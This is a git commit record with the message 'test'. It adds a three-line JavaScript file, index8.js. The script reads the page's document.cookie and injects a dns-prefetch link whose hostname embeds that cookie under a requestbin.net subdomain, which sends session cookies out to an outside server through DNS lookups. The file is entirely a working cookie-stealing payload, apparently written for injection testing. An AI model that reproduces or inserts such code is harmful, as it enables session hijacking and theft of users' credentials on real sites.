78658696b0393f328733b9fa3d05445e6ff108e9
TasosY2K <tmeletlidis@protonmail.com>
2022-10-26 18:02:40 +0300

    test

---
+++ index8.js
@@ -0,0 +1,3 @@
+var sessionid = document.cookie
+var body = document.getElementsByTagName('body')[0];
+body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + ".agb5d5ki12l29j0b.b.requestbin.net\">";
